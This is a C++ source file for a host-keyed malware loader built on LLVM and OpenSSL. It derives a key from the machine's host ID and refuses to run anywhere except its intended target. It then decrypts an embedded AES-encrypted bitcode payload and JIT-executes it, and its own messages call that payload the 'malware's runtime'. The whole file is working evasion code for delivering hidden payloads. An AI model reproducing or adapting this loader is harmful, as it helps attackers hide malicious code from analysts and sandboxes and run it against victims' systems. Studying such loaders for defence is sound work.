#include <iostream>

#include <llvm/ExecutionEngine/ExecutionEngine.h>
#include <llvm/ExecutionEngine/MCJIT.h>
#include <llvm/IR/Module.h>
#include <llvm/IRReader/IRReader.h>
#include <llvm/IR/LLVMContext.h>
#include <llvm/Support/MemoryBuffer.h>
#include <llvm/Support/SourceMgr.h>

#include "boot.h"

#include <string.h>

#include <openssl/evp.h>
#include <openssl/err.h>

using namespace llvm;
using namespace std;

static ExecutionEngine *TheExecutionEngine;

extern unsigned char _binary_runtime_bc_enc_start;
extern unsigned char _binary_runtime_bc_enc_end;
extern unsigned char _binary_runtime_bc_enc_size;
extern unsigned char _binary_verify_key_start;
extern unsigned char _binary_verify_key_end;
extern unsigned char _binary_verify_key_size;

void boot_response(bool is_valid_host);  // prototype

bool verbose = false;

bool is_valid_hostid(const char *hostid) {
    const EVP_CIPHER *cipher = EVP_aes_128_cbc();

    const char *verify_salt = verSalt;
    const int keylen = cipher->key_len + cipher->iv_len; 

    unsigned char *verify_keybuf = (unsigned char*)malloc(keylen);

    const char *password = getHostId();

    if (verbose) {
        cout << "Deriving verification key from passphrase." << endl;
    }
    
    if(!PKCS5_PBKDF2_HMAC(password, strlen(password),
                          (const unsigned char *)verify_salt, 
                          strlen(verify_salt), 10000, EVP_sha256(), 
                          keylen, verify_keybuf)) {
        fprintf(stderr, "EVP_BytesToKey failed\n");
        exit(1);
    }

    if (verbose) {
        printf("Derived verification key:  ");
        for (int i = 0; i < keylen; i++) {
            printf("%02x", verify_keybuf[i]);
        }
        printf("\n");

        printf("Expected verification key: ");
        for (int i = 0; i < (size_t)&_binary_verify_key_size; i++) {
            printf("%02x", (&_binary_verify_key_start)[i]);      
        }
        printf("\n");
    }

    return memcmp(verify_keybuf, (unsigned char *)&_binary_verify_key_start, (size_t)&_binary_verify_key_size) != 0;
}

/**
    Unpack a program referred to by data.
    The decrypting stub code will go here.
*/
Module *unpack_program(LLVMContext &context, const char *start, size_t size) {
    SMDiagnostic error;

    const EVP_CIPHER *cipher = EVP_aes_128_cbc();

    const char *salt = decryptSalt;

    unsigned char key[16] = {0};
    unsigned char iv[16] = {0};
   
    const int keylen = cipher->key_len + cipher->iv_len; 
    unsigned char *keybuf = (unsigned char*)malloc(keylen); 
    
    if (verbose) {
        cout << "Unpacking LLVM bitcode" << endl; 
    }
 
    /**
        Get the system info as a password.
    */
    const char *password = getHostId();

    if (verbose) { 
    	cout << "HostId is " << password << endl;
    }

    if(!PKCS5_PBKDF2_HMAC(password, strlen(password),
                          (const unsigned char *)salt, 
                          strlen(salt), 10000, EVP_sha256(), 
                          keylen, keybuf)) {
        fprintf(stderr, "EVP_BytesToKey failed\n");
        exit(1);
    }

    if (verbose) {
       printf("Computed Decryption Key: "); 
       for(int i=0; i<cipher->key_len; ++i) { 
          printf("%02x", keybuf[i]); 
       } printf("\n");

       printf("Computed IV: "); 
       for(int i=cipher->key_len; i<keylen; ++i) { 
          printf("%02x", keybuf[i]); 
       } printf("\n");
    }
 
    /**
        Copy the key and iv into their own spots.
    */    
    memcpy(key, keybuf, cipher->key_len);
    memcpy(iv, keybuf+cipher->key_len, cipher->iv_len);

    /**
        Decrypt the payload
    */ 
    EVP_CIPHER_CTX cipherctx;

    EVP_CIPHER_CTX_init(&cipherctx);
        
    EVP_DecryptInit_ex(&cipherctx, EVP_aes_128_cbc(), NULL, key, iv);

    unsigned char *bitcode = (unsigned char *)malloc(size+EVP_MAX_BLOCK_LENGTH);
    int outsize;

    if(!EVP_DecryptUpdate(&cipherctx, bitcode, &outsize, (unsigned const char*)start, size)) {
        /* Error */
        ERR_print_errors_fp(stderr);
        EVP_CIPHER_CTX_cleanup(&cipherctx);
        fprintf(stderr, "Error decrypting!");
        exit(1);
    }

    int tmp;

    if(!EVP_DecryptFinal_ex(&cipherctx, bitcode+outsize, &tmp)) {
        /* Error */
        ERR_print_errors_fp(stderr);
        EVP_CIPHER_CTX_cleanup(&cipherctx);
        exit(1);
    }
 
    outsize += tmp;

    /**
        Unpack data 
    */
    StringRef bitcoderef((const char*)bitcode, outsize);

    auto program = MemoryBuffer::getMemBuffer(bitcoderef, "", false);
 
    Module *m = parseIR(program->getMemBufferRef(), error, context).release();

    if (!m) {
        cerr << "Module could not be found!" << endl;
        exit(1);
    }
    
    if (verbose) {
        cout << "LLVM bitcode recovered!" << endl;
    }

    return m;
}

int main(int argc, const char *argv[])
{
  LLVMInitializeNativeTarget();
  LLVMInitializeNativeAsmPrinter();
  LLVMInitializeNativeAsmParser();

  LLVMContext context;
  SMDiagnostic error;

  if (argc > 1 && strcmp(argv[1], "-v") == 0) {
      verbose = true;
  }

  if (verbose) {
     cout << "Verifying that we are on the right host." << endl;
  }

  const char *hostid = getHostId();

  if(is_valid_hostid(hostid)) {
      boot_response(false); 
      if (verbose) {
          cout << "INCORRECT KEY: Program was not run on its target!" << endl;
      }
      exit(1);
  } else {
      boot_response(true);
  }

  if (verbose) {
     cout << "Verification succeeded, proceeding to unpack runtime." << endl;
  }

  Module *m = unpack_program(context, 
  (const char*)&_binary_runtime_bc_enc_start, 
  (size_t)&_binary_runtime_bc_enc_size);

  if (verbose) {
     cout << "Unpacking successful, proceeding to execution " << endl;
     cout << "Creating JIT Execution Engine." << endl;
  }

  // Create the JIT.  This takes ownership of the module.
  TheExecutionEngine = EngineBuilder(std::unique_ptr<Module>(m)).create();

  Function *f = m->getFunction("main");

  if (!f) {
   cerr << "Function payload not defined!" << endl;
   exit(1);
  }

  TheExecutionEngine->finalizeObject();

  // JIT the function, returning a function pointer.
  void *FPtr = TheExecutionEngine->getPointerToFunction(f);

  typedef int(*mainfunc)(int argc, const char*[]);

  mainfunc FP = (mainfunc)FPtr;
  
  if (verbose) {
      cout << "Running malware's runtime." << endl;
  }

  FP(argc, argv);

  return 0;
}
